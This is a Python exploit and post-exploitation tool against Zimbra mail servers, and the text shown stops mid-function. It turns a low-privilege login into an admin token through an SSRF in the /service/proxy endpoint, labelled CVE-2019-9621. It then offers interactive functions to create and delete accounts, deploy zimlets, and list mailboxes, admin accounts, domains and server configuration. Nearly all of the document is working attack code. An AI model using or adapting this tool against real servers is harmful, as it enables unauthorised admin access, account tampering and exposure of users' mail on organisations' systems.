#python3
import sys
import requests
import re
from requests_toolbelt import MultipartEncoder
import warnings
warnings.filterwarnings("ignore")
from datetime import datetime

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
}

def auth_request_low(uri,username,password):
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">              
           </context>
       </soap:Header>
       <soap:Body>
         <AuthRequest xmlns="urn:zimbraAccount">
            <account by="adminName">{username}</account>
            <password>{password}</password>
         </AuthRequest>
       </soap:Body>
    </soap:Envelope>
    """
    try:
        r=requests.post(uri+"/service/soap",headers=headers,data=request_body.format(username=username,password=password),verify=False,timeout=15)
        if 'authentication failed' in r.text:
            print("[-] Authentication failed for %s"%(username))
            exit(0)
        elif 'authToken' in r.text:
            pattern_auth_token=re.compile(r"<authToken>(.*?)</authToken>")
            token = pattern_auth_token.findall(r.text)[0]
            print("[+] Authentication success for %s"%(username))
            print("[*] authToken_low:%s"%(token))
            return token
        else:
            print("[!]")
            print(r.text)
    except Exception as e:
        print("[!] Error:%s"%(e))
        exit(0)
   
def auth_request_admin(uri,username,password):
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">            
           </context>
       </soap:Header>
       <soap:Body>
         <AuthRequest xmlns="urn:zimbraAdmin">
            <account by="adminName">{username}</account>
            <password>{password}</password>
         </AuthRequest>
       </soap:Body>
    </soap:Envelope>
    """
    try:
        r=requests.post(uri+":7071/service/admin/soap",headers=headers,data=request_body.format(username=username,password=password),verify=False,timeout=15)
        if 'authentication failed' in r.text:
            print("[-] Authentication failed for %s"%(username))
            exit(0)
        elif 'authToken' in r.text:
            pattern_auth_token=re.compile(r"<authToken>(.*?)</authToken>")
            token = pattern_auth_token.findall(r.text)[0]
            print("[+] Authentication success for %s"%(username))
            print("[*] authToken_admin:%s"%(token))
            return token
        else:
            print("[!]")
            print(r.text)
    except Exception as e:
        print("[!] Error:%s"%(e))
        exit(0)

def lowtoken_to_admintoken_by_SSRF(uri,username,password):
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">
           </context>
       </soap:Header>
       <soap:Body>
         <AuthRequest xmlns="{xmlns}">
            <account by="adminName">{username}</account>
            <password>{password}</password>
         </AuthRequest>
       </soap:Body>
    </soap:Envelope>
    """
    print("[*] Try to auth for low token")
    try:
        r=requests.post(uri+"/service/soap",headers=headers,data=request_body.format(xmlns="urn:zimbraAccount",username=username,password=password),verify=False)
        if 'authentication failed' in r.text:
            print("[-] Authentication failed for %s"%(username))
            exit(0)
        elif 'authToken' in r.text:
            pattern_auth_token=re.compile(r"<authToken>(.*?)</authToken>")
            low_token = pattern_auth_token.findall(r.text)[0]
            print("[+] Authentication success for %s"%(username))
            print("[*] authToken_low:%s"%(low_token))
            headers["Content-Type"]="application/xml"
            headers["Cookie"]="ZM_ADMIN_AUTH_TOKEN="+low_token+";"
            headers["Host"]="foo:7071"
            print("[*] Try to get admin token by SSRF(CVE-2019-9621)")    
            s = requests.session()
            r = s.post(uri+"/service/proxy?target=https://127.0.0.1:7071/service/admin/soap",headers=headers,data=request_body.format(xmlns="urn:zimbraAdmin",username=username,password=password),verify=False)
            if 'authToken' in r.text:
                admin_token =pattern_auth_token.findall(r.text)[0]
                print("[+] Success for SSRF")
                print("[+] ADMIN_TOKEN: "+admin_token)
                return admin_token
            else:
                print("[-] SSRF failed")
                exit(0)
        else:
            print("[!]")
            print(r.text)
            exit(0)
    except Exception as e:
        print("[!] Error:%s"%(e))
        exit(0)
 
def createaccount_request(uri,token):
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">
               <authToken>{token}</authToken>
           </context>
       </soap:Header>
       <soap:Body>
         <CreateAccountRequest xmlns="urn:zimbraAdmin">
          <name>{user}</name>
          <password>{password}</password>
         </CreateAccountRequest>
       </soap:Body>
    </soap:Envelope>
    """

    print("[*] Input the user :")
    print("    Eg.:test1@test.com")   
    user = input("[>]: ")
    print("[*] Input the password :")   
    password = input("[>]: ")

    try:
        print("[*] Try to createaccount")
        r=requests.post(uri+":7071/service/admin/soap",headers=headers,data=request_body.format(token=token,user=user,password=password),verify=False,timeout=15)
        if "email address already exists" in r.text:
            print("[-] Account already exists,try another username.")
        elif "invalid password" in r.text:
            print("[-] Try hard password.")
        elif "id=" in r.text:
            print("[+] Success")
            pattern_id = re.compile(r"id=\"(.*?)\"")
            accountid = pattern_id.findall(r.text)[0] 
            print("    AccountId: %s"%(accountid))             
        else:
            print("[!]")
            print(r.text)
    except Exception as e:
        print("[!] Error:%s"%(e))        

def createaccount_requestSSRF(uri,token):
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">
               <authToken>{token}</authToken>
           </context>
       </soap:Header>
       <soap:Body>
         <CreateAccountRequest xmlns="urn:zimbraAdmin">
          <name>{user}</name>
          <password>{password}</password>
         </CreateAccountRequest>
       </soap:Body>
    </soap:Envelope>
    """

    print("[*] Input the user :")
    print("    Eg.:test1@test.com")   
    user = input("[>]: ")
    print("[*] Input the password :")   
    password = input("[>]: ")

    headers["Content-Type"]="application/xml"
    headers["Cookie"]="ZM_ADMIN_AUTH_TOKEN="+token+";"
    headers["Host"]="foo:7071"

    try:
        print("[*] Try to createaccount")
        r=requests.post(uri+"/service/proxy?target=https://127.0.0.1:7071/service/admin/soap",headers=headers,data=request_body.format(token=token,user=user,password=password),verify=False,timeout=15)
        if "email address already exists" in r.text:
            print("[-] Account already exists,try another username.")
        elif "invalid password" in r.text:
            print("[-] Try hard password.")
        elif "id=" in r.text:
            print("[+] Success")
            pattern_id = re.compile(r"id=\"(.*?)\"")
            accountid = pattern_id.findall(r.text)[0] 
            print("    AccountId: %s"%(accountid))             
        else:
            print("[!]")
            print(r.text)
    except Exception as e:
        print("[!] Error:%s"%(e))        

def deleteaccount_request(uri,token):
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">
               <authToken>{token}</authToken>
           </context>
       </soap:Header>
       <soap:Body>
         <DeleteAccountRequest xmlns="urn:zimbraAdmin">
          <id>{id}</id>
         </DeleteAccountRequest>
       </soap:Body>
    </soap:Envelope>
    """

    print("[*] Input the AccountId :")
    id = input("[>]: ")

    try:
        print("[*] Try to deleteaccount")
        r=requests.post(uri+":7071/service/admin/soap",headers=headers,data=request_body.format(token=token,id=id),verify=False,timeout=15)
        print("    ok")
        print(r.text)
    except Exception as e:
        print("[!] Error:%s"%(e))

def deleteaccount_requestSSRF(uri,token):
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">
               <authToken>{token}</authToken>
           </context>
       </soap:Header>
       <soap:Body>
         <DeleteAccountRequest xmlns="urn:zimbraAdmin">
          <id>{id}</id>
         </DeleteAccountRequest>
       </soap:Body>
    </soap:Envelope>
    """

    print("[*] Input the AccountId :")
    id = input("[>]: ")

    headers["Content-Type"]="application/xml"
    headers["Cookie"]="ZM_ADMIN_AUTH_TOKEN="+token+";"
    headers["Host"]="foo:7071"

    try:
        print("[*] Try to deleteaccount")
        r=requests.post(uri+"/service/proxy?target=https://127.0.0.1:7071/service/admin/soap",headers=headers,data=request_body.format(token=token,id=id),verify=False,timeout=15)
        print("    ok")
        print(r.text)
    except Exception as e:
        print("[!] Error:%s"%(e))

def deployzimlet_request(uri,token):
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">
               <authToken>{token}</authToken>
           </context>
       </soap:Header>
       <soap:Body>
         <DeployZimletRequest xmlns="urn:zimbraAdmin" action="deployAll" flush="true">
          <content>
            <aid>{id}</aid>
          </content> 
         </DeployZimletRequest>
       </soap:Body>
    </soap:Envelope>
    """

    print("[*] Input the attachment id :") 
    id = input("[>]: ")
    try:
        print("[*] Try to deployzimlet")
        r=requests.post(uri+":7071/service/admin/soap",headers=headers,data=request_body.format(token=token,id=id),verify=False,timeout=15)
        if "succeeded" in r.text:           
            print("[+] Success")             
        else:
            print("[!]")
            print(r.text)
    except Exception as e:
        print("[!] Error:%s"%(e))

def deployzimlet_requestSSRF(uri,token):
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">
               <authToken>{token}</authToken>
           </context>
       </soap:Header>
       <soap:Body>
         <DeployZimletRequest xmlns="urn:zimbraAdmin" action="deployAll" flush="true">
          <content>
            <aid>{id}</aid>
          </content> 
         </DeployZimletRequest>
       </soap:Body>
    </soap:Envelope>
    """

    print("[*] Input the attachment id :") 
    id = input("[>]: ")

    headers["Content-Type"]="application/xml"
    headers["Cookie"]="ZM_ADMIN_AUTH_TOKEN="+token+";"
    headers["Host"]="foo:7071"

    try:
        print("[*] Try to deployzimlet")
        r=requests.post(uri+"/service/proxy?target=https://127.0.0.1:7071/service/admin/soap",headers=headers,data=request_body.format(token=token,id=id),verify=False,timeout=15)
        if "succeeded" in r.text:           
            print("[+] Success")             
        else:
            print("[!]")
            print(r.text)
    except Exception as e:
        print("[!] Error:%s"%(e))

def undeployzimlet_request(uri,token):
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">
               <authToken>{token}</authToken>
           </context>
       </soap:Header>
       <soap:Body>
         <UndeployZimletRequest xmlns="urn:zimbraAdmin">
          <name>{name}</name>
         </UndeployZimletRequest>
       </soap:Body>
    </soap:Envelope>
    """

    print("[*] Input the name :") 
    name = input("[>]: ")
    try:
        print("[*] Try to undeployzimlet")
        r=requests.post(uri+":7071/service/admin/soap",headers=headers,data=request_body.format(token=token,name=name),verify=False,timeout=15)
        print("    ok")
        print(r.text)        
    except Exception as e:
        print("[!] Error:%s"%(e))

def undeployzimlet_requestSSRF(uri,token):
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">
               <authToken>{token}</authToken>
           </context>
       </soap:Header>
       <soap:Body>
         <UndeployZimletRequest xmlns="urn:zimbraAdmin">
          <name>{name}</name>
         </UndeployZimletRequest>
       </soap:Body>
    </soap:Envelope>
    """

    print("[*] Input the name :") 
    name = input("[>]: ")

    headers["Content-Type"]="application/xml"
    headers["Cookie"]="ZM_ADMIN_AUTH_TOKEN="+token+";"
    headers["Host"]="foo:7071"   
    try:
        print("[*] Try to undeployzimlet")
        r=requests.post(uri+"/service/proxy?target=https://127.0.0.1:7071/service/admin/soap",headers=headers,data=request_body.format(token=token,name=name),verify=False,timeout=15)
        print("    ok")
        print(r.text)        
    except Exception as e:
        print("[!] Error:%s"%(e))

def deletezimlet_request(uri,token):
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">
               <authToken>{token}</authToken>
           </context>
       </soap:Header>
       <soap:Body>
         <DeleteZimletRequest xmlns="urn:zimbraAdmin">
          <zimlet>
            <name>{name}</name>
          </zimlet> 
         </DeleteZimletRequest>
       </soap:Body>
    </soap:Envelope>
    """

    print("[*] Input the name :") 
    name = input("[>]: ")
    try:
        print("[*] Try to deletezimlet")
        r=requests.post(uri+":7071/service/admin/soap",headers=headers,data=request_body.format(token=token,name=name),verify=False,timeout=15)
        print("    ok")
        print(r.text)        
    except Exception as e:
        print("[!] Error:%s"%(e))

def deletezimlet_requestSSRF(uri,token):
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">
               <authToken>{token}</authToken>
           </context>
       </soap:Header>
       <soap:Body>
         <DeleteZimletRequest xmlns="urn:zimbraAdmin">
          <zimlet>
            <name>{name}</name>
          </zimlet> 
         </DeleteZimletRequest>
       </soap:Body>
    </soap:Envelope>
    """

    print("[*] Input the name :") 
    name = input("[>]: ")

    headers["Content-Type"]="application/xml"
    headers["Cookie"]="ZM_ADMIN_AUTH_TOKEN="+token+";"
    headers["Host"]="foo:7071"

    try:
        print("[*] Try to deletezimlet")
        r=requests.post(uri+"/service/proxy?target=https://127.0.0.1:7071/service/admin/soap",headers=headers,data=request_body.format(token=token,name=name),verify=False,timeout=15)
        print("    ok")
        print(r.text)        
    except Exception as e:
        print("[!] Error:%s"%(e))

def getallzimlet_request(uri,token):
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">
               <authToken>{token}</authToken>
           </context>
       </soap:Header>
       <soap:Body>
         <GetAllZimletsRequest xmlns="urn:zimbraAdmin">
         </GetAllZimletsRequest>
       </soap:Body>
    </soap:Envelope>
    """

    try:
        print("[*] Try to getallzimlet")
        r=requests.post(uri+":7071/service/admin/soap",headers=headers,data=request_body.format(token=token),verify=False,timeout=15)
        print("[*] Try to save the response")        
        with open("getallzimlet.xml", 'w+', encoding='utf-8') as file_object:
            file_object.write(r.text)
        print("[*] Save as getallzimlet.xml")       
    except Exception as e:
        print("[!] Error:%s"%(e))

def getallzimlet_requestSSRF(uri,token):
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">
               <authToken>{token}</authToken>
           </context>
       </soap:Header>
       <soap:Body>
         <GetAllZimletsRequest xmlns="urn:zimbraAdmin">
         </GetAllZimletsRequest>
       </soap:Body>
    </soap:Envelope>
    """

    headers["Content-Type"]="application/xml"
    headers["Cookie"]="ZM_ADMIN_AUTH_TOKEN="+token+";"
    headers["Host"]="foo:7071"

    try:
        print("[*] Try to getallzimlet")
        r=requests.post(uri+"/service/proxy?target=https://127.0.0.1:7071/service/admin/soap",headers=headers,data=request_body.format(token=token),verify=False,timeout=15)
        print("[*] Try to save the response")        
        with open("getallzimlet.xml", 'w+', encoding='utf-8') as file_object:
            file_object.write(r.text)
        print("[*] Save as getallzimlet.xml")       
    except Exception as e:
        print("[!] Error:%s"%(e))

def getaccount_request(uri,token):
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">
               <authToken>{token}</authToken>
           </context>
       </soap:Header>
       <soap:Body>
         <GetAccountRequest xmlns="urn:zimbraAdmin">
          <account by="name">{mail}</account> 
         </GetAccountRequest>
       </soap:Body>
    </soap:Envelope>
    """

    print("[*] Input the user :")
    print("    Eg.:test1@test.com")   
    mail = input("[>]: ")

    try:
        print("[*] Try to getaccount")
        r=requests.post(uri+":7071/service/admin/soap",headers=headers,data=request_body.format(token=token,mail=mail),verify=False,timeout=15)
        if "id" in r.text:
            pattern_id = re.compile(r"id=\"(.*?)\"")
            accountid = pattern_id.findall(r.text)[0] 
            print("    AccountId: %s"%(accountid))             
        else:
            print("[!]")
            print(r.text)
    except Exception as e:
        print("[!] Error:%s"%(e))

def getaccount_requestSSRF(uri,token):
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">
               <authToken>{token}</authToken>
           </context>
       </soap:Header>
       <soap:Body>
         <GetAccountRequest xmlns="urn:zimbraAdmin">
          <account by="name">{mail}</account> 
         </GetAccountRequest>
       </soap:Body>
    </soap:Envelope>
    """

    print("[*] Input the user :")
    print("    Eg.:test1@test.com")   
    mail = input("[>]: ")

    headers["Content-Type"]="application/xml"
    headers["Cookie"]="ZM_ADMIN_AUTH_TOKEN="+token+";"
    headers["Host"]="foo:7071"

    try:
        print("[*] Try to getaccount")
        r=requests.post(uri+"/service/proxy?target=https://127.0.0.1:7071/service/admin/soap",headers=headers,data=request_body.format(token=token,mail=mail),verify=False,timeout=15)
        if "id" in r.text:
            pattern_id = re.compile(r"id=\"(.*?)\"")
            accountid = pattern_id.findall(r.text)[0] 
            print("    AccountId: %s"%(accountid))             
        else:
            print("[!]")
            print(r.text)
    except Exception as e:
        print("[!] Error:%s"%(e))

def getalldomains_request(uri,token):
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">
               <authToken>{token}</authToken>
           </context>
       </soap:Header>
       <soap:Body>
         <GetAllDomainsRequest xmlns="urn:zimbraAdmin">
         </GetAllDomainsRequest>
       </soap:Body>
    </soap:Envelope>
    """
    try:
        print("[*] Try to get all domain names")
        r=requests.post(uri+":7071/service/admin/soap",headers=headers,data=request_body.format(token=token),verify=False,timeout=15)
        if "name" in r.text:
            pattern_name = re.compile(r"zimbraDomainName\">(.*?)<")
            name = pattern_name.findall(r.text)
            for i in range(len(name)):       
                print("[+] Domain name: %s"%(name[i]))
        else:
            print("[!]")
            print(r.text)
    except Exception as e:
        print("[!] Error:%s"%(e))

def getalldomains_requestSSRF(uri,token):
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">
               <authToken>{token}</authToken>
           </context>
       </soap:Header>
       <soap:Body>
         <GetAllDomainsRequest xmlns="urn:zimbraAdmin">
         </GetAllDomainsRequest>
       </soap:Body>
    </soap:Envelope>
    """
    headers["Content-Type"]="application/xml"
    headers["Cookie"]="ZM_ADMIN_AUTH_TOKEN="+token+";"
    headers["Host"]="foo:7071"

    try:
        print("[*] Try to get all domain names")
        r=requests.post(uri+"/service/proxy?target=https://127.0.0.1:7071/service/admin/soap",headers=headers,data=request_body.format(token=token),verify=False,timeout=15)
        if "name" in r.text:
            pattern_name = re.compile(r"zimbraDomainName\">(.*?)<")
            name = pattern_name.findall(r.text)
            for i in range(len(name)):       
                print("[+] Domain name: %s"%(name[i]))
        else:
            print("[!]")
            print(r.text)
    except Exception as e:
        print("[!] Error:%s"%(e))

def getallaccounts_request(uri,token):
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">
               <authToken>{token}</authToken>
           </context>
       </soap:Header>
       <soap:Body>
         <GetAllAccountsRequest xmlns="urn:zimbraAdmin">
         </GetAllAccountsRequest>
       </soap:Body>
    </soap:Envelope>
    """
    try:
        print("[*] Try to get all accounts")
        r=requests.post(uri+":7071/service/admin/soap",headers=headers,data=request_body.format(token=token),verify=False,timeout=15)
        pattern_name = re.compile(r"name=\"(.*?)\"")
        name = pattern_name.findall(r.text)
        pattern_accountId = re.compile(r"id=\"(.*?)\"")
        accountId = pattern_accountId.findall(r.text)     
        for i in range(len(name)):
            print("[+] Name:%s,Id:%s"%(name[i],accountId[i]))
    except Exception as e:
        print("[!] Error:%s"%(e))

def getallaccounts_requestSSRF(uri,token):
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">
               <authToken>{token}</authToken>
           </context>
       </soap:Header>
       <soap:Body>
         <GetAllAccountsRequest xmlns="urn:zimbraAdmin">
         </GetAllAccountsRequest>
       </soap:Body>
    </soap:Envelope>
    """
    headers["Content-Type"]="application/xml"
    headers["Cookie"]="ZM_ADMIN_AUTH_TOKEN="+token+";"
    headers["Host"]="foo:7071"

    try:
        print("[*] Try to get all accounts")
        r=requests.post(uri+"/service/proxy?target=https://127.0.0.1:7071/service/admin/soap",headers=headers,data=request_body.format(token=token),verify=False,timeout=15)
        pattern_name = re.compile(r"name=\"(.*?)\"")
        name = pattern_name.findall(r.text)
        pattern_accountId = re.compile(r"id=\"(.*?)\"")
        accountId = pattern_accountId.findall(r.text)     
        for i in range(len(name)):
            print("[+] Name:%s,Id:%s"%(name[i],accountId[i]))
    except Exception as e:
        print("[!] Error:%s"%(e))

def getalladminaccounts_request(uri,token):
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">
               <authToken>{token}</authToken>
           </context>
       </soap:Header>
       <soap:Body>
         <GetAllAdminAccountsRequest xmlns="urn:zimbraAdmin">
         </GetAllAdminAccountsRequest>
       </soap:Body>
    </soap:Envelope>
    """   
    try:
        print("[*] Try to get all admin accounts")
        r=requests.post(uri+":7071/service/admin/soap",headers=headers,data=request_body.format(token=token),verify=False,timeout=15)
        pattern_name = re.compile(r"name=\"(.*?)\"")
        name = pattern_name.findall(r.text)
        pattern_accountId = re.compile(r"id=\"(.*?)\"")
        accountId = pattern_accountId.findall(r.text)      
        for i in range(len(name)):
            print("[+] Admin name:%s,Id:%s"%(name[i],accountId[i]))
    except Exception as e:
        print("[!] Error:%s"%(e))

def getalladminaccounts_requestSSRF(uri,token):
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">
               <authToken>{token}</authToken>
           </context>
       </soap:Header>
       <soap:Body>
         <GetAllAdminAccountsRequest xmlns="urn:zimbraAdmin">
         </GetAllAdminAccountsRequest>
       </soap:Body>
    </soap:Envelope>
    """
    headers["Content-Type"]="application/xml"
    headers["Cookie"]="ZM_ADMIN_AUTH_TOKEN="+token+";"
    headers["Host"]="foo:7071"

    try:
        print("[*] Try to get all admin accounts")
        r=requests.post(uri+"/service/proxy?target=https://127.0.0.1:7071/service/admin/soap",headers=headers,data=request_body.format(token=token),verify=False,timeout=15)
        pattern_name = re.compile(r"name=\"(.*?)\"")
        name = pattern_name.findall(r.text)
        pattern_accountId = re.compile(r"id=\"(.*?)\"")
        accountId = pattern_accountId.findall(r.text)      
        for i in range(len(name)):
            print("[+] Admin name:%s,Id:%s"%(name[i],accountId[i]))
    except Exception as e:
        print("[!] Error:%s"%(e))

def getallmailboxes_request(uri,token):
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">
               <authToken>{token}</authToken>
           </context>
       </soap:Header>
       <soap:Body>
         <GetAllMailboxesRequest xmlns="urn:zimbraAdmin">
         </GetAllMailboxesRequest>
       </soap:Body>
    </soap:Envelope>
    """
    try:
        print("[*] Try to get all mailboxes")
        r=requests.post(uri+":7071/service/admin/soap",headers=headers,data=request_body.format(token=token),verify=False,timeout=15)
        pattern_accountId = re.compile(r"accountId=\"(.*?)\"")
        accountId = pattern_accountId.findall(r.text)
        for id in accountId:
            print("[+] accountId:%s"%(id))

    except Exception as e:
        print("[!] Error:%s"%(e))

def getallmailboxes_requestSSRF(uri,token):
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">
               <authToken>{token}</authToken>
           </context>
       </soap:Header>
       <soap:Body>
         <GetAllMailboxesRequest xmlns="urn:zimbraAdmin">
         </GetAllMailboxesRequest>
       </soap:Body>
    </soap:Envelope>
    """
    headers["Content-Type"]="application/xml"
    headers["Cookie"]="ZM_ADMIN_AUTH_TOKEN="+token+";"
    headers["Host"]="foo:7071"

    try:
        print("[*] Try to get all mailboxes")
        r=requests.post(uri+"/service/proxy?target=https://127.0.0.1:7071/service/admin/soap",headers=headers,data=request_body.format(token=token),verify=False,timeout=15)
        pattern_accountId = re.compile(r"accountId=\"(.*?)\"")
        accountId = pattern_accountId.findall(r.text)
        for id in accountId:
            print("[+] accountId:%s"%(id))

    except Exception as e:
        print("[!] Error:%s"%(e))

def getmailbox_request(uri,token,id):
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">
               <authToken>{token}</authToken>
           </context>
       </soap:Header>
       <soap:Body>
         <GetMailboxRequest xmlns="urn:zimbraAdmin">
            <mbox>
              <id>{id}</id>
            </mbox>
         </GetMailboxRequest>
       </soap:Body>
    </soap:Envelope>
    """   
    try:
        print("[*] Try to get mailbox of %s"%(id))
        r=requests.post(uri+":7071/service/admin/soap",headers=headers,data=request_body.format(token=token,id=id),verify=False,timeout=15)
        print(r.text)
    except Exception as e:
        print("[!] Error:%s"%(e))

def getserver_request(uri,token):
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">
               <authToken>{token}</authToken>
           </context>
       </soap:Header>
       <soap:Body>
         <GetServerRequest xmlns="urn:zimbraAdmin">
          <server by="serviceHostname">{serviceHostname}</server>
         </GetServerRequest>
       </soap:Body>
    </soap:Envelope>
    """
    print("[*] Input the serviceHostname:")
    serviceHostname = input("[>]: ")
    try:
        print("[*] Try to get server config")
        r=requests.post(uri+":7071/service/admin/soap",headers=headers,data=request_body.format(token=token,serviceHostname=serviceHostname),verify=False,timeout=15)
        if "zimbraId" in r.text:
            pattern_data = re.compile(r"zimbraId\">(.*?)</a")        
            zimbraId = pattern_data.findall(r.text)[0]
            print("    zimbraId:"+zimbraId)
            return zimbraId
        else:
            print("[!]")
            print(r.text)
    except Exception as e:
        print("[!] Error:%s"%(e))

def getserver_requestSSRF(uri,token):
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">
               <authToken>{token}</authToken>
           </context>
       </soap:Header>
       <soap:Body>
         <GetServerRequest xmlns="urn:zimbraAdmin">
          <server by="serviceHostname">{serviceHostname}</server>
         </GetServerRequest>
       </soap:Body>
    </soap:Envelope>
    """
    print("[*] Input the serviceHostname:")
    serviceHostname = input("[>]: ")

    headers["Content-Type"]="application/xml"
    headers["Cookie"]="ZM_ADMIN_AUTH_TOKEN="+token+";"
    headers["Host"]="foo:7071"

    try:
        print("[*] Try to get server config")
        r=requests.post(uri+"/service/proxy?target=https://127.0.0.1:7071/service/admin/soap",headers=headers,data=request_body.format(token=token,serviceHostname=serviceHostname),verify=False,timeout=15)
        if "zimbraId" in r.text:
            pattern_data = re.compile(r"zimbraId\">(.*?)</a")        
            zimbraId = pattern_data.findall(r.text)[0]
            print("    zimbraId:"+zimbraId)
            return zimbraId
        else:
            print("[!]")
            print(r.text)
    except Exception as e:
        print("[!] Error:%s"%(e))

def getservernifs_request(uri,token):
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">
               <authToken>{token}</authToken>
           </context>
       </soap:Header>
       <soap:Body>
         <GetServerNIfsRequest xmlns="urn:zimbraAdmin">
         <server by="serviceHostname">{serviceHostname}</server>
         </GetServerNIfsRequest>
       </soap:Body>
    </soap:Envelope>
    """
    print("[*] Input the serviceHostname:")
    serviceHostname = input("[>]: ")    

    try:
        print("[*] Try to get Network Interface information for a server")
        r=requests.post(uri+":7071/service/admin/soap",headers=headers,data=request_body.format(token=token,serviceHostname=serviceHostname),verify=False,timeout=15)       

        print("[*] Try to save the response")        
        with open("GetServerNIfs.xml", 'w+', encoding='utf-8') as file_object:
            file_object.write(r.text)
        print("[*] Save as GetServerNIfs.xml")
    except Exception as e:
        print("[!] Error:%s"%(e))

def getservernifs_requestSSRF(uri,token):
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">
               <authToken>{token}</authToken>
           </context>
       </soap:Header>
       <soap:Body>
         <GetServerNIfsRequest xmlns="urn:zimbraAdmin">
         <server by="serviceHostname">{serviceHostname}</server>
         </GetServerNIfsRequest>
       </soap:Body>
    </soap:Envelope>
    """
    print("[*] Input the serviceHostname:")
    serviceHostname = input("[>]: ")

    headers["Content-Type"]="application/xml"
    headers["Cookie"]="ZM_ADMIN_AUTH_TOKEN="+token+";"
    headers["Host"]="foo:7071"

    try:
        print("[*] Try to get Network Interface information for a server")
        r=requests.post(uri+"/service/proxy?target=https://127.0.0.1:7071/service/admin/soap",headers=headers,data=request_body.format(token=token,serviceHostname=serviceHostname),verify=False,timeout=15)       

        print("[*] Try to save the response")        
        with open("GetServerNIfs.xml", 'w+', encoding='utf-8') as file_object:
            file_object.write(r.text)
        print("[*] Save as GetServerNIfs.xml")
    except Exception as e:
        print("[!] Error:%s"%(e))


def getmemcachedconfig_request(uri,token):
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">
               <authToken>{token}</authToken>
           </context>
       </soap:Header>
       <soap:Body>
         <GetMemcachedClientConfigRequest xmlns="urn:zimbraAdmin">
         </GetMemcachedClientConfigRequest>
       </soap:Body>
    </soap:Envelope>
    """  
    try:
        print("[*] Try to get memcached config")
        r=requests.post(uri+":7071/service/admin/soap",headers=headers,data=request_body.format(token=token),verify=False,timeout=15)
        if "serverList" in r.text:
            pattern_config = re.compile(r"serverList=\"(.*?)\"")
            config = pattern_config.findall(r.text)[0]
            print("[+] ServerList: "+config)
        else:
            print("[!]")
            print(r.text)
    except Exception as e:
        print("[!] Error:%s"%(e))

def getmemcachedconfig_requestSSRF(uri,token):
    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
       <soap:Header>
           <context xmlns="urn:zimbra">
               <authToken>{token}</authToken>
           </context>
       </soap:Header>
       <soap:Body>
         <GetMemcachedClientConfigRequest xmlns="urn:zimbraAdmin">
         </GetMemcachedClientConfigRequest>
       </soap:Body>
    </soap:Envelope>
    """
    headers["Content-Type"]="application/xml"
